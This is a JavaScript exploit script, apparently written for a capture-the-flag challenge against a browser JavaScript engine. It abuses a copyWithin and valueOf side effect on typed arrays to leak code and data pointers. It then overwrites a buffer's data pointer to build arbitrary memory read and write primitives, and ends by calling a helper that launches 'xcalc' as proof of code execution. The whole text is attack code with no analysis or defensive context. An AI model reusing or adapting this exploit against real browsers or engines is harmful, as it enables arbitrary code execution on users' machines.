var buf_size = 0x18 * 4;

var buf1 = new ArrayBuffer(buf_size);
var buf2 = new ArrayBuffer(buf_size);

var arr1 = new Uint32Array(buf1);
var arr2 = new Uint32Array(buf2);

arr1.fill(0x40414140, 0, buf_size/4);
arr2.fill(0x41424241, 0, buf_size/4);

var hax = {
  valueOf: function() {
    arr1.offset = 12;
    return 12;
  }
};

// Trigger vulnerability
arr1 =  arr1.copyWithin(0, hax, 0x18);

var code_leak = new Int64(arr1[6], arr1[7]);
var arr_region_leak = new Int64(arr1[8], arr1[9]);
arr_region_leak.lshift1Op(); // private pointer

// Keeping a backup of correct values
var backup = [];
for (var i = 0;i<12;i++) {
  backup[i] = arr1[i];
}

// Overwrite's buf2's DATA slot
function overwrite_addr(addr) {
  // Fixing offset
  arr1.offset = 0;

  // Restoring backup
  for (var i = 0;i<12;i++) {
    arr1[12 + i] = backup[i];
  }

  var private_addr = Int64.rshift1(addr);
  arr1[20] = private_addr.lower();
  arr1[21] = private_addr.upper();
  arr1 = arr1.copyWithin(12, 0, hax);
}

// Arbitrary read/write primitives (even address only!)
function a_read(addr) {
  overwrite_addr(addr);
  // Creating a new view because TypedArrays store a local copy of data
  // pointer which we haven't overwritten
  var newArray = new Uint32Array(buf2);
  var bytes = [];
  var num = newArray[0];
  for (var i = 0;i<4;i++) {
    bytes[i] = num % 0x100;
    num = Math.floor(num / 0x100);
  }
  return bytes;
}

function a_write(addr, value) {
  overwrite_addr(addr);
  // Creating a new view because TypedArrays store a local copy of data
  // pointer which we haven't overwritten
  var newArray = new Uint32Array(buf2);
  var final_value = 0;
  for (var i = 0;i<4;i++) {
    final_value = final_value*0x100 + value[3-i];
  }
  newArray[0] = final_value;
}

elf_addr = new Int64(0x400000, 0);
pwnfox_exploit(a_read, a_write, elf_addr, "xcalc");
